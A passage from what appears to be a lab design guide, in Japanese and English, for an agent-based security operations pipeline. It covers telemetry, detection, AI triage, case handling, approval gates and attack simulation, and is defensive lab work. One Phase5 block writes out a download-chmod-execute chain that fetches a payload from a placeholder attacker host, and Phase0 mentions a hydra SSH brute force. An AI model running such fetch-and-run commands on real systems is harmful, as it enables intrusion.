| ubuntu-victim02 | persistence / lateral | 2 vCPU / 4GB / 50GB |
| windows-victim01 | Windows telemetry | 4 vCPU / 8GB / 100GB |
| dc01 | AD / identity lab | 4 vCPU / 8GB / 100GB |
| honeypot01 | fake service / share | 2 vCPU / 2-4GB / 40GB |

## Node2 (SOC Core)

| VM | Role | Suggested Spec |
|---|---|---|
| soc-analyzer | detection / correlation / incident builder | 6 vCPU / 16GB / 200GB |
| wazuh | SIEM / EDR platform | 4 vCPU / 8GB / 200GB |
| log-pipeline | Vector / Fluent Bit | 2 vCPU / 4GB / 80GB |
| thehive | case management | 2 vCPU / 6GB / 100GB |
| velociraptor | investigation / DFIR | 2 vCPU / 4GB / 80GB |
| ai-soc | AI triage / investigation / planning client | 4 vCPU / 8GB / 100GB |

---

# 4. Final Architecture

```text
Attack Simulation + Background Activity + Deception
                        │
                        ▼
                 Victim Network
          (Linux / Windows / AD / Honeypot)
                        │
                        ▼
                 Telemetry Collection
      (auth.log / Sysmon / auditd / Wazuh agent)
                        │
                        ▼
                   Log Pipeline
              (Vector / Fluent Bit)
                        │
                        ▼
                 Detection Engine
     (Python / Sigma-like rules / future Wazuh)
                        │
                        ▼
                Correlation Engine
                        │
                        ▼
                 Incident Builder
                        │
                        ▼
                   Triage Agent
                        │
                        ▼
              Investigation Analysis
                        │
                        ▼
                     Case Agent
                        │
                        ▼
                   Action Agent
                        │
                        ▼
             Executor Agent / Approval Gate
                        │
                        ▼
      DFIR / External Integrations / Case Systems
         (Velociraptor / TheHive / future adapters)
                        │
                        ▼
                 Rule Improvement
                        │
                        ▼
                      Attack Again
```

> Note:
> 攻撃側はまず Scenario / Attacker ベースで進める。
> 将来的には objective-driven planner、specialist delegation、tool selection、memory / graph を持つ攻撃側へ拡張可能とする。

---

# 5. Agent Architecture

ラボで段階的に作るAgent一覧。

| Agent | Role | Main Phase |
|---|---|---|
| Telemetry Agent | raw log / forwarded log の取得 | Phase0 |
| Log Parser Agent | auth.log / sshd / sudo / auditd などを normalized event に正規化 | Phase0 / Phase5 |
| Detection Agent | deterministic detection / behavior_features 付与 | Phase1 / Phase6 |
| Correlation Agent | atomic detection を dedupe / correlation し incident の入口を作る | Phase1 / Phase6 |
| Incident Builder Agent | correlated detection から `incident.json` を生成 | Phase1 |
| Triage Agent | SOC分析 / 初期判断 / risk_score / derived_features / assessment | Phase2 / Phase6 |
| Rule Triage Baseline | AI triage と比較する deterministic baseline | Phase6 |
| Investigation Agent (pre-case) | incident / triage / defender-side telemetry を用いた evidence-aware investigation。`investigation_result.json`、enriched features、evidence gaps、pivots を生成する。 | Phase4 / Phase6 |
| Case Agent | run結果を `case.json` に正規化し action planning の入力境界を作る。collection result がある場合は dedicated DFIR fields のみ append する。 | Phase4 / Phase6 |
| Post-action DFIR / Integration Workflow | Action / collection 後の outcome と collected outputs を扱い、DFIR evidence review、reviewed finding-based case enrichment、optional external case update を行う。pre-case Investigation Agent とは別責務。 | Follow-on |
| TheHive Agent | initial `case.json` から case / observable を外部連携し、将来は reviewed post-action DFIR findings を追加更新する。 | Phase4 / Phase5 / Follow-on |
| Velociraptor Agent | DFIR collection request 生成、collection outcome integration、将来の actual collection execution。 | Phase4 / Phase5 / Follow-on |
| Action Agent | case / evidence に基づく対応方針 / playbook 生成 | Phase2拡張 / Phase5 / Phase6 |
| Executor Agent | playbook 実行 / approval gate / decision_log 記録 | Phase5 / 将来拡張 |
| Scenario Agent | 攻撃シナリオ定義 | Phase3 |
| Attacker Agent | 攻撃実行 / `attack_result` / `attack_execution_log` / `attack_observed_effects` 生成 | Phase3 / Phase6 |
| Attack Planner Agent | objective を subtask に分解し tool / specialist を選択（将来拡張） | Phase3拡張 / 将来 |
| Rule Improvement Agent | compare / judge から rule / prompt / promotion candidate と review を生成 | Phase6 |
| Scenario Orchestrator / Harness Runner | process pipeline / triage・investigation・action harness / batch compare の実行制御 | Phase6 |
| Deception Agent | honeytoken / honey share / decoy生成 | Phase7 |
| Trap Detection Agent | deception hit 検知 | Phase7 |
| Background Activity Agent | 正常系ノイズ生成 | Phase8 |

## 5.1 Agent Dependency

```text
Telemetry Agent
   ↓
Log Parser Agent
   ↓
Detection Agent
   ↓
Correlation Agent
   ↓
Incident Builder Agent
   ↓
Triage Agent
   ↓
Pre-case Investigation Agent
   ↓
Case Agent (initial case)
   ↓
Action Agent
   ↓
Executor Agent / Approval Gate
   ├─ initial TheHive / Case integrations
   ├─ Collection / Velociraptor execution (after approval when required)
   │    ↓
   │  Post-action DFIR / Integration Workflow
   │    ├─ reviewed finding-based case enrichment
   │    ├─ optional external case update
   │    └─ human-reviewable follow-up signal
   └─ Rule Improvement Agent

Scenario Agent
   ↓
Attacker Agent
   ↓
Scenario Orchestrator

Deception Agent
   ↓
Trap Detection Agent

Background Activity Agent
   ↓
Telemetry / Detection realism
```

## 5.2 Initial Minimum Viable Agent Order

最初から全部作らない。最初のMVPは以下の4つ。

1. Telemetry Agent
2. Detection Agent
3. Incident Builder Agent
4. Triage Agent

Note: This order describes the original build-up path.
Current implementation has progressed through Phase6 extended MVP.

次に追加するもの:

5. Correlation Agent
6. Scenario Agent / Attacker Agent
7. Case Agent / Investigation Agent
8. Action Agent / Executor Agent
9. Deception Agent
10. Background Activity Agent
11. Rule Improvement Agent / Orchestrator

---

# 6. Phase Roadmap

この章は、`docs/roadmap/phase0.md`〜`phase6.md` の要約版として維持する。
詳細な設計・実装判断は各 phase document を source of truth とし、この Master Guide は全体像と現在地を把握するための index とする。

## 6.1 Phase0 — SOC Pipeline Baseline

Goal:
- Attack → Log → Forward → Parse → Detect → Incident の最小パイプラインを構築する

Implemented:
- Kali から SSH brute force を実施（hydra）
- Ubuntu victim の `auth.log` を取得
- rsyslog により `soc-analyzer` へ転送
- parser-agent により sshd ログを正規化
- `ssh_failed_login` ルールを実装
- detection を元に `INC-0001.json` を生成

Architecture:

```text
Kali
  ↓
SSH brute force
  ↓
Ubuntu auth.log
  ↓
rsyslog forward
  ↓
soc-analyzer
  ↓
parser-agent
  ↓
detection-agent
  ↓
incident-builder-agent
```

Primary outputs:
- `data/normalized/normalized_events.json`
- `data/detections/detection_hits.json`
- `data/incidents/INC-0001.json`

Status:
- 最小 SOC pipeline 構築完了
- 攻撃から incident 生成までの自動化に成功

## 6.2 Phase1 — Correlation & Incident Builder

Goal:
- 単発 detection を correlation し、調査・分析に使える `incident.json` を生成する

Implemented agents:
- parser-agent
- detection-agent
- correlation-agent
- incident-builder-agent

Data flow:

```text
attack
  ↓
log (auth.log / sshd.log / sudo.log)
  ↓
log forwarding (rsyslog)
  ↓
parser-agent
  ↓
normalized_events.json
  ↓
detection-agent
  ↓
detection_hits.json
  ↓
correlation-agent
  ↓
correlated_incidents.json
  ↓
incident-builder-agent
  ↓
incident.json
```

Implemented event types:
- `ssh_failed_login`
- `ssh_success_login`
- `sudo_command`

Initial MITRE ATT&CK mapping:
- `ssh_failed_login` → T1110
- `ssh_success_login` → T1078
- `sudo_command` → T1548

Implemented scenario correlation:

```text
ssh_failed_login
  ↓
ssh_success_login
  ↓
sudo_command
```

Correlation conditions:
- success の前に failed（15分以内）
- success の後に sudo（10分以内）
- host / username が一致
- sudo 起点に変更し、重複を抑制
- 最も近い success のみ使用

Design principles:
- parser = ログ解釈
- detection = 意味付け
- correlation = ストーリー化
- incident builder = 表現
- detection はログフォーマットではなく `event_type` を見る

Known limitations:
- failed が多すぎる場合のノイズ
- confidence が固定
- 単一ホスト前提
- lateral movement 未対応

## 6.3 Phase2 — AI SOC Triage & Action Planning

Goal:
- `incident.json` をもとに AI による triage を行い、優先度付けと初動対応 plan を自動生成する

Architecture:

```text
incident.json
  ↓
ai-triage-agent
  ↓
triage_result.json
  ↓
action-agent
  ↓
action_result.json
```

Triage output:
- `verdict`（malicious / suspicious / benign）
- `confidence`（low / medium / high）
- `summary`
- `attack_story`
- `key_observations`
- `mitre_attack`
- `recommended_actions`
- `priority`（P1 / P2 / P3）
- `risk_score`（0〜100）

Action output:
- `action_result.json`

Initial action types:
- `isolate_host`
- `disable_account`
- `alert_soc_team`
- `monitor` / `log_only`

Design principles:
- Detect は deterministic
- AI は analyst / triage に使用
- Action は machine-readable に出力
- 人間の判断を補助しつつ、段階的に自動化する

Known limitations at Phase2:
- action は planned のみ
- CMDB / asset context が無い
- 誤検知の完全排除は不可
- 単一 incident 前提

## 6.4 Phase3 — Attacker Agent & Scenario Execution

Goal:
- 攻撃を scenario YAML と attacker-agent により再現可能にする
- controlled execution の結果を structured artifact として保存する

Architecture:

```text
scenario.yaml
  ↓
attacker-agent
  ↓ (ssh)
kali-attacker
  ↓
target (victim)
  ↓
SOC pipeline
  (parser → detection → correlation → incident → triage → action)
```

Implemented capabilities:
- YAML による attack scenario 定義
- attacker-agent による攻撃実行
- Kali attacker host への remote execution
- dry-run mode
- step filtering (`--step`)
- full execution (`--execute`)
- structured `attack_result.json` output
- `attack_id` generation
- `started_at` / `ended_at` timestamps
- Makefile-based orchestration

Run isolation:
- parser は `attack_result.json` の `started_at` を使って対象 log を filter する
- これにより「current attack log のみを処理」「1 run → 1 incident」を保証する

Traceability:
- `attack_id` を pipeline 全体へ伝播する
- 対象: normalized events / detection hits / correlated incidents / incident / triage / action

Evaluation:
- `evaluation_result.json` を導入
- expected artifacts と observed artifacts を比較
- missed detection / basic false positive を確認

Initial expected artifacts:
- `ssh_failed_login`
- `ssh_success_login`
- `sudo_command`

## 6.5 Phase4 — Case Agent and Integration Preparation

Goal:
- attack / detection / triage / evaluation の machine-oriented outputs を SOC-style `case.json` に変換する
- TheHive / Velociraptor など外部連携に向けた内部 data model を固める

Main concept:

```text
scenario
  ↓
attack
  ↓
detection / triage
  ↓
evaluation
  ↓
case-agent
  ↓
case.json
```

Input sources:
- `scenario.json`
- `attack_result.json`
- `triage_result.json`（optional）
- `evaluation_result.json`

Output:
- `case.json`

Case model required fields:
- `case_id`
- `attack_id`
- `scenario_id`
- `title`
- `status`
- `severity`
- `summary`
- `attack_result`
- `detection_result`
- `coverage`

Recommended fields:
- `triage_result`
- `key_artifacts`
- `timeline`
- `recommended_actions`

Implemented / prepared deliverables:
- case-agent
- `case_schema.json`
- sample `case.json`
- TheHive adapter MVP
- observable mapping
- Velociraptor DFIR request generator（no execution）
- core builder / rule logic tests

TheHive lab findings:
- case creation returns both `_id` and `number`
- observable attachment requires `_id`, not `number`
- observable `dataType` must match UI-supported values
- validated observable types: `ip`, `hostname`, `other`
- rejected / unsupported in this lab: `host`, `username`

Velociraptor design decisions:
- Velociraptor は primary pipeline component ではなく follow-on DFIR adapter
- 初期実装では collection request の生成のみ行い、直接 API execution はしない
- MVP では triage verdict が `malicious` の場合のみ DFIR trigger
- artifact selection は minimal / fixed

## 6.6 Phase5 — Endpoint Telemetry / Process-Focused Detection

Goal:
- ログベース検知から process-based / behavior-based 検知へ進化する

Concept:
- Detect = deterministic
- AI = triage / analysis
- DFIR = follow-on（Velociraptor）
- Phase5 では process visibility を導入する

Architecture:

```text
scenario
  ↓
attack
  ↓
endpoint telemetry (auditd)
  ↓
normalized process events
  ↓
detection (process chain)
  ↓
incident
  ↓
triage (AI)
  ↓
case.json (process enrichment)
  ↓
TheHive
  ↓
action planning
  ↓
playbook
  ↓
executor
  ↓
Velociraptor (on-demand)
```

Phase5 MVP scope:
- auditd で process execution を取得（execve）
- process event を ISO8601 timestamp で正規化
- process chain detection（behavior）
- incident / triage / case の run 単位出力
- case に process timeline / summary を追加
- severity を process ベースで補正
- TheHive に case / observables を連携
- action-agent で playbook を生成
- executor-agent で playbook を実行
- Velociraptor で補助調査
- `decision_log` に detection / triage / action / execution を記録

Out of scope:
- full EDR reproduction
- network / file telemetry の同時実装
- 多数 scenario 追加
- lateral movement の広範囲対応
- fully autonomous containment

Initial attack chain:

```text
curl -o /tmp/payload.sh http://<attacker_ip>/payload.sh
chmod +x /tmp/payload.sh
/bin/bash /tmp/payload.sh
```

Detection behavior:

```text
download → chmod → execute
```

Detection characteristics:
- 複数 event の連鎖
- 5分 window
- host / user correlation

Case enrichment:
- `process_summary`
- `process_timeline`

Action / approval boundary:
- `request_dfir_collection` → auto
- `alert_soc_team` → auto
- `review_payload_execution` → auto
- `consider_host_isolation` → pending approval

Velociraptor usage:
- `Linux.BashHistory`
- `Linux.ProcessList`
- 常時収集ではなく、case / playbook trigger で実行

Run outputs:
- `process_events.json`
- `interesting_process_events.json`
- `process_chain_hits.json`
- `incident.json`
- `triage_result.json`
- `case.json`
- `action_result.json`
- `collection_request.json`
- `decision_log.json`

Why Phase5 matters:
- 攻撃の「流れ」が見える
- 単一ログではなく「行動」で検知できる
- case の説明力が向上する
- EDR に近い detection model へ進化する
- planning / execution / approval の分離ができる
- Phase6 の behavior-feature 化 / improvement loop の土台になる

## 6.7 Phase6 — Behavior Feature + Automated Improvement Loop

Goal:
- scenario-specific detection / one-off AI judgment から、各 stage の artifact を compare / judge / review / improve できる pipeline へ移行する

Phase6 positioning:
- 単一機能の implementation phase ではなく integration phase
- deterministic detection、AI interpretation、evidence-aware investigation、action planning、reviewable improvement candidates を接続する

Current status:
- Phase6 extended MVP complete
- defense-side comparison spine は action planning まで到達
- action output は DFIR request generation と接続済み
- attacker-agent は Phase A/B から Phase C artifact contracts / observed-effects runtime generation / additive evaluation alignment へ進展済み

Core design:

```text
detection
  ↓
behavior_features
  ↓
triage
  ↓
derived_features
  ↓
assessment
  ↓
investigation
  ↓
enriched_features / evidence
  ↓
case / action / DFIR
```

Feature boundaries:
- `behavior_features`: detection が付与する観測事実
- `derived_features`: triage が生成する意味付け
- `assessment`: verdict / confidence / priority / risk_score などの運用判断
- `enriched_features` / evidence: investigation stage の文脈と証拠

Implemented capabilities:
- Atomic detection DSL foundation
- canonical detection output model
- initial artifact coverage: `ssh_failed_login`, `ssh_success_login`, `ssh_key_login`, `authorized_keys_modification`, `process_exec`
- correlation-first incident entry
- DSL evaluator / dedupe / correlation boundary cleanup
- AI triage output
- rule-triage baseline
- `derived_features`
- `assessment`
- `triage_diff.json`
- triage comparison harness
- batch comparison across scenario_004 / 005 / 006
- independent `investigation_result.json`
- evidence-aware investigation fields
- optional evidence inputs: `process_events.json`, `process_chain_hits.json`, `zeek_enrichment.json`, `endpoint_events.json`
  - `endpoint_events.json` is defender-side factual telemetry for observed facts, supporting signals, and evidence-grounded endpoint-derived enriched features; it does not replace `auditd_events.json`, change verdicts, or promote Rule Improvement candidates.
- investigation harness MVP
- case generation from incident / triage / investigation
- canonical `case.timeline`
- action-agent planning from case
- action policy registry
- canonical action types
- typed targets
- `evidence_refs`
- approval / auto-executable boundary
- action comparison harness MVP
- `action_result.json` → `collection_request.json`
- collection request schema validation
- Rule Improvement Agent
- artifact-aware candidate generation
- `rule_candidates.yaml`
- `prompt_candidates.yaml`
- `promotion_recommendation.yaml`
- `candidate_review.md`
- `observed_effects_alignment_signals.json`
- observed-effects alignment signals surfaced in `candidate_review.md`
- batch validation support

Attacker-agent Phase6 status:
- Phase A dispatcher skeleton
- scenario loader / validator / backend selector
- step backend and shell backend
- `attack_scenario.schema.json`
- scenario_004 / 005 / 006 migration to `attack_scenario_v1`
- runtime schema validation
- schema metadata bridge into `attack_result.json`
- `attack_result.schema.json`
- `attack_execution_log.schema.json`
- `attack_observed_effects.schema.json`
- shell backend stdout / stderr preservation
- attacker-agent runtime generation of `attack_observed_effects.json`
- additive `observed_effects_alignment` in `evaluation_result.json`
- structured runner output contract
- parser for `ATTACK_EVENT_JSON:` stdout lines
- scenario_006 structured runner events
- `attack_observed_effects.json` prefers structured runner events when present
- legacy stdout marker / exit-code fallback remains backward compatible
- Rule Improvement Agent can generate `observed_effects_alignment_signals.json`
  from `evaluation_result.observed_effects_alignment`
- `candidate_review.md` surfaces observed-effects alignment signals for human review
- observed-effects alignment signals remain separate from automatic rule candidate generation

Scenario coverage:

| Scenario | Description | Primary artifacts |
|---|---|---|
| scenario_004 | SSH brute force followed by authorized_keys persistence installation | `ssh_failed_login`, `ssh_success_login`, `authorized_keys_modification` |
| scenario_005 | SSH public-key persistence reuse | `ssh_key_login` |
| scenario_006 | SSH public-key login followed by post-login command execution | `ssh_key_login`, `process_exec` |

Typical run directory:

```text
data/runs/<run_id>/
  process_events.json
  interesting_process_events.json
  process_chain_hits.json
  ssh_auth_events.json
  dsl_detection_outputs_auth_runlocal.json
  dsl_detection_outputs_process.json
  dsl_auth_deduped_detections.json
  dsl_deduped_detections.json
  dsl_correlations.json
  incident.json
  triage_result.json
  investigation_result.json
  triage_rule.json
  triage_diff.json
  attack_result.json
  attack_execution_log.json
  attack_observed_effects.json
  evaluation_result.json
  case.json
  action_result.json
  collection_request.json
  decision_log.json
  zeek_conn_events.json
  zeek_http_events.json
  zeek_enrichment.json
```

Typical harness run directory:

```text
data/harness_runs/<harness_run_id>/
  input/
  optional_inputs/
  agents/
  compare.json
  judge_result.json
  summary.md
  metadata.json
```

Phase6 completed criteria:
- feature boundaries are defined
- detection emits behavior features and canonical artifacts
- triage / investigation / action harnesses are implemented
- Rule Improvement Agent produces reviewable candidates
- batch validation works across scenario_004 / 005 / 006
- action output can trigger DFIR collection request
- attacker-agent artifact contracts exist
- observed-effects runtime coverage is confirmed for scenario_004 / 005 / 006
- `observed_effects_alignment` is additive and does not change verdict behavior
- structured runner output contract exists

Current open items:

Defense-side follow-ons:
- candidate apply / promotion apply with human approval
- Wazuh integration as baseline collection / alert / search source
- broader mock or collector output generation and additional post-action DFIR artifact parsers
- Velociraptor actual collection result ingestion
- executor / DFIR execution-result comparison harness after post-action artifact semantics stabilize; post-action result-quality harness MVP is implemented separately
- process execution beyond current SSH / persistence scenarios
- multi-host correlation
- external intelligence enrichment

Offense-side follow-ons:
- reviewer-approved conversion from observed-effects signals to concrete rule or prompt candidates
- richer attack artifacts beyond current scenario_004 / 005 / 006 coverage
- extend observed-effects alignment smoke checks only when new scenario families introduce new artifact mappings
- maintain structured runner event coverage for scenario_004 / 005 / 006 and extend it only when new scenario families require new mappings
- shell backend formalization follow-ons
- TTP catalog
- TTP composition mode
- autonomous planner / supervisor
- assessment mode

Next priorities:

1. observed-effects alignment signals は human review 入力として扱い、自動 candidate promotion は避ける
2. pre-case Investigation Agent と post-action DFIR workflow の artifact / ownership boundary を維持する
3. 実装済み post-action DFIR MVP に additional parser / collector output mapping を必要に応じて追加する
4. shell backend safety と runner output policy を observed-effects design と揃える
5. structured runner event emission は既存 scenario で smoke 確認済みのため、新しい scenario family で必要な場合のみ拡張する
6. attacker-side artifact contracts が安定した後に Wazuh / Velociraptor integration を継続する

## 6.8 Phase7 — Deception Layer

Goal:
- local-lab only の agentic deception で high-confidence defender-side signal を作る
- deterministic trap observation を source of truth とし、AI は hit 発生判定の source of truth にはしない

Tasks:
- `deception_inventory.yaml` scope
- local decoy asset generation
- defender-observable `deception_hits.json`
- future incident bridge
- canonical detection output integration は後続

Agents:
- Deception Agent
- Trap Detection Agent

Deliverables:
- `docs/design/deception/agentic_deception_mvp_scope.md`
- `docs/design/deception/deception_scenario_contract.md`
- `docs/roadmap/phase7.md`
- future `deception_inventory.yaml`
- future `deception_hits.json`

Boundaries:
- deception hits are high-confidence signals, but they do not bypass approval gates
- deception hits do not automatically trigger containment
- deception hits do not automatically trigger apply / deploy / update / promotion
- canary endpoints are local-lab only for the MVP
- attacker-agent untrusted artifact safety is a related follow-on track, not part of the first deception MVP

Current status:
- Phase7 deception artifact foundation is complete through schema, generators, incident bridge, and chain smoke.
- Scenario YAML / runner implementation is intentionally deferred until attacker-agent behavior and response/SIEM integration are more mature.

## 6.9 Phase8 — Background Activity / Telemetry Explosion

Goal:
- ノイズを増やして本物の SOC に近づける

Tasks:
- normal user activity generator
- admin activity generator
- scheduled task / cron / package update / file access
- false positive rate 測定

Agents:
- Background Activity Agent

Deliverables:
- normal scenarios
- telemetry realism metrics
- FP tuning notes

---

# 7. Recommended Directory Structure

```text
ai-soc-lab/
├─ README.md
├─ docs/
│  ├─ architecture/
│  │  ├─ overview.md
│  │  ├─ node-layout.md
│  │  ├─ agent-architecture.md
│  │  └─ deception-design.md
│  ├─ roadmap/
│  │  ├─ roadmap.md
│  │  ├─ phase0.md
│  │  ├─ phase1.md
│  │  ├─ phase2.md
│  │  ├─ phase3.md
│  │  ├─ phase4.md
│  │  ├─ phase5.md
│  │  ├─ phase6.md
│  │  ├─ phase7.md
│  │  └─ phase8.md
│  ├─ design/
│  │  ├─ event-schema.md
│  │  ├─ directory-structure.md
│  │  └─ soc_lab_improvement.md
│  ├─ operations/
│  │  ├─ runbook.md
│  │  ├─ case-workflow.md
│  │  └─ investigation-playbooks.md
│  └─ research/
│     ├─ metrics.md
│     ├─ detection-gap-analysis.md
│     └─ ai-soc-usecases.md
├─ infra/
│  ├─ proxmox/
│  ├─ terraform/
│  ├─ ansible/
│  │  ├─ inventories/
│  │  ├─ group_vars/
│  │  └─ roles/
│  └─ diagrams/
├─ configs/
│  ├─ vector/
│  ├─ wazuh/
│  ├─ thehive/
│  ├─ velociraptor/
│  └─ ollama/
├─ schemas/
│  ├─ normalized_event.schema.json
│  ├─ incident.schema.json
│  ├─ case_schema.json
│  └─ triage_report.schema.json
├─ rules/
│  ├─ detection/
│  │  ├─ linux/
│  │  ├─ windows/
│  │  └─ correlation/
│  ├─ sigma/
│  └─ deception/
├─ scenarios/
│  ├─ attack/
│  │  ├─ scenario_001_ssh_bruteforce.yaml
│  │  ├─ scenario_002_persistence.yaml
│  │  └─ scenario_003_discovery.yaml
│  ├─ normal/
│  │  ├─ linux_admin_activity.yaml
│  │  ├─ windows_user_activity.yaml
│  │  └─ backup_activity.yaml
│  └─ purple/
├─ workflows/
│  ├─ incident_response.yaml
│  ├─ process_execution.yaml
│  └─ payload_investigation.yaml
├─ integrations/
│  ├─ thehive/
│  ├─ velociraptor/
│  ├─ atomic/
│  ├─ caldera/
│  ├─ siem/
│  └─ threat_intel/
├─ agents/
│  ├─ telemetry/
│  ├─ parser/
│  ├─ detection/
│  ├─ correlation/
│  ├─ incident_builder/
│  ├─ triage/
│  ├─ attacker/
│  ├─ scenario/
│  ├─ case/
│  ├─ investigation/
│  ├─ action/
│  ├─ executor/
│  ├─ rule_improvement/
│  ├─ deception/
│  ├─ background_activity/
│  └─ orchestrator/
├─ data/
│  ├─ runs/
│  │  └─ <run_id>/
│  ├─ reports/
│  ├─ forensic/
│  └─ metrics/
├─ tests/
│  ├─ unit/
│  ├─ integration/
│  └─ scenario/
├─ notebooks/
├─ scripts/
│  ├─ bootstrap/
│  ├─ run_scenario.sh
│  ├─ collect_logs.sh
│  └─ generate_report.sh
└─ pyproject.toml
```

## Directory Philosophy

- docs/: 判断を残す場所
- infra/: VM / 構築
- configs/: 各ミドルウェア設定
- schemas/: データ形式の固定化
- rules/: deterministic detection の本体
- scenarios/: 攻撃 / 正常系 / purple team の再現性
- workflows/: 制御フローの定義
- integrations/: 外部ツール差し替え層
- agents/: 自作SOC automation本体
- data/: 実行結果
- tests/: 再現性の担保

---

# 8. Suggested Document Set to Maintain While Building

進めながら残すべき資料。

## 8.1 Always update
- docs/architecture/overview.md
- docs/roadmap/roadmap.md
- docs/operations/runbook.md
- docs/design/soc_lab_improvement.md

## 8.2 Update per phase
- docs/roadmap/phaseX.md
- docs/research/metrics.md
- docs/research/detection-gap-analysis.md

## 8.3 Update per incident / scenario
- scenarios/attack/*.yaml
- data/runs/
- data/reports/
- docs/operations/investigation-playbooks.md

---

# 9. Key Schemas / Artifact Contracts

この lab では、agent の実装詳細よりも **artifact contract** を重視する。
各 stage は JSON / YAML artifact を出力し、後段はその artifact を入力として扱う。

## 9.1 Normalized Event

```json
{
  "timestamp": "2026-03-16T10:00:00Z",
  "host": "ubuntu-victim01",
  "event_type": "ssh_failed_login",
  "src_ip": "10.0.1.10",
  "user": "root",
  "raw_log": "...",
  "rule": null,
  "severity": null
}
```

Process telemetry では以下のような normalized process event を扱う。

```json
{
  "event_type": "process_exec",
  "timestamp": "2026-03-24T08:08:09Z",
  "host": "ubuntu-victim01",
  "pid": 1234,
  "ppid": 1200,
  "user": "victim01",
  "exe": "/usr/bin/curl",
  "command_line": "curl ...",
  "cwd": "/home/victim01",
  "source": "auditd"
}
```

## 9.2 Detection / Atomic Artifact

Detection は deterministic に行い、原則として observation-level の `behavior_features` のみを付与する。

Primary artifact examples:
- `ssh_failed_login`
- `ssh_success_login`
- `ssh_key_login`
- `authorized_keys_modification`
- `sudo_command`
- `process_exec`
- `suspicious_download_chmod_execute`

## 9.3 Incident JSON

```json
{
  "incident_id": "INC-0001",
  "scenario_name": "ssh_bruteforce_priv_esc",
  "severity": "high",
  "host": "ubuntu-victim01",
  "src_ip": "10.0.1.10",
  "timeline": [],
  "matched_rules": [
    "ssh_failed_login",
    "ssh_success_login",
    "sudo_command"
  ],
  "behavior_features": {
    "credential_access": true,
    "privilege_escalation": true
  }
}
```

## 9.4 Triage Result

```json
{
  "incident_id": "INC-0001",
  "verdict": "malicious",
  "confidence": "high",
  "priority": "P1",
  "risk_score": 85,
  "summary": "Possible brute force followed by privilege escalation.",
  "attack_story": "The source IP attempted multiple SSH logins...",
  "key_observations": [],
  "mitre_attack": [],
  "recommended_actions": []
}
```

## 9.5 Feature Lifecycle

```json
{
  "behavior_features": {},
  "derived_features": {},
  "assessment": {},
  "enriched_features": {}
}
```

責務境界:
- `behavior_features`: detection が付与する観測事実
- `derived_features`: triage が生成する意味付け
- `assessment`: verdict / confidence / priority / risk_score などの判断
- `enriched_features`: investigation が補強する文脈・証拠

## 9.6 Investigation Result

`investigation_result.json` は triage とは独立した artifact として扱う。

Key fields:
- `evidence_level`
- `evidence_summary`
- `unsupported_claims`
- `missing_pivots`
- `recommended_pivots`
- `enriched_features`

Optional inputs:
- `process_events.json`
- `process_chain_hits.json`
- `zeek_enrichment.json`

## 9.7 Case JSON

`case.json` は action planning の入力境界であり、external integrations に向けた source of truth である。

Required fields:
- `case_id`
- `attack_id`
- `scenario_id`
- `title`
- `status`
- `severity`
- `summary`
- `attack_result`
- `detection_result`
- `coverage`

Recommended fields:
- `triage_result`
- `key_artifacts`
- `timeline`
- `recommended_actions`
- `process_summary`
- `process_timeline`
- `investigation_notes`

## 9.8 Action Result / Approval Boundary

`action_result.json` は response plan / playbook を machine-readable に表現する。

重要な境界:
- safe step は auto-executable
- sensitive step は approval gate
- containment 系は原則 pending approval
- action は case / evidence に grounding する

Example action types:
- `request_dfir_collection`
- `collect_payload_or_process_evidence`
- `alert_soc_team`
- `review_payload_execution`
- `consider_host_isolation`

## 9.9 Collection Request

`collection_request.json` は action_result から生成される DFIR request artifact。

Current trigger types:
- `request_dfir_collection`
- `collect_payload_or_process_evidence`

Design notes:
- action-driven context を `collection_request.context.action_types` に保持する
- Velociraptor は follow-on DFIR として扱い、常時収集はしない

## 9.10 Collection Result

`collection_result.json` は `collection_request.json` の実行結果、手動収集結果、または mock collection result を記録する DFIR outcome artifact である。

```text
action_result.json
  ↓
collection_request.json
  ↓
collection_result.json
  ├─ outcome-only case enrichment: `dfir_collection_summary` / `dfir_evidence_refs` (implemented)
  └─ post-action DFIR run workflow MVP / future external integration workflow
       ↓
     future executor / DFIR result comparison
```

主な責務:

- requested / completed / partial / failed / skipped / cancelled などの collection status を記録する
- `collected_artifacts` / `failed_artifacts` / `skipped_artifacts` を分けて保持する
- `collection_request.json` / `action_result.json` / `case.json` への traceability を残す
- Velociraptor / manual / mock / future collector を共通の result model に寄せる
- collected evidence の参照を `output_refs` として保持する
- run-based mock collection では controlled `Linux.Syslog.SSHLogin` output を `forensics/mock/Linux.Syslog.SSHLogin.json` に書き、collected artifact の `output_refs` から参照する

重要な境界:

- collection result は evidence transport artifact であり、pre-case `investigation_result.json` の conclusion ではない
- post-action DFIR workflow は pre-case Investigation Agent と別責務であり、既存 `investigation_result.json` を上書きしない
- verdict / severity / confidence / `overall_result` / `detected` は collection outcome だけでは変更しない
- action approval や containment decision を変更しない
- Rule Improvement candidate / promotion を自動生成しない

詳細 design:

- `docs/design/dfir/collection_result_contract.md`
- `docs/design/dfir/collection_result_ingestion.md`

## 9.11 Attacker-side Artifact Contracts

Attacker Agent は以下を分離して出力する。

```text
attack_result.json
  攻撃runのサマリ

attack_execution_log.json
  shell backend / runner の実行ログ

attack_observed_effects.json
  攻撃側で観測した効果
```

重要な境界:

```text
attacker-side observed effect != defender-side observed artifact
```

この分離により、攻撃側では成功しているが防御側では検知できていない gap を `observed_effects_alignment` として扱える。

## 9.12 Evaluation Result / Observed Effects Alignment

`evaluation_result.json` は expected / observed coverage に加え、Phase6 では additive signal として `observed_effects_alignment` を保持する。

重要な方針:
- attacker-side observation と defender-side detection は分離する
- `observed_effects_alignment` は既存の `overall_result` / `detected` / verdict behavior を変更しない
- `observed_effects_alignment_signals.json` は Rule Improvement の human-reviewable signal artifact である
- `attacker_observed_defender_missing` は review signal として扱い、自動で rule candidate に変換しない

## 9.13 Harness Artifacts

Harness run は以下を基本 artifact とする。

```text
data/harness_runs/<harness_run_id>/
  input/
  optional_inputs/
  agents/
  compare.json
  judge_result.json
  summary.md
  metadata.json
```

Triage / rule improvement 系では追加で以下を生成する。

```text
rule_candidates.yaml
prompt_candidates.yaml
promotion_recommendation.yaml
parser_candidates.yaml
rule_improvement_export_artifact_validation_summary.json
observed_effects_alignment_signals.json
candidate_review.md
```

---

# 10. Recommended Build Order

現時点では Phase0〜6 の主要 MVP は成立しているため、今後は「次に何を伸ばすか」を明確にする。

## Completed Foundation

### Step 1 — Basic SOC Pipeline
- Phase0
- Phase1
- Phase2

Built:
- telemetry
- parser
- detection
- correlation
- incident builder
- AI triage
- initial action plan

### Step 2 — Reproducible Attack / Case Workflow
- Phase3
- Phase4

Built:
- scenario library
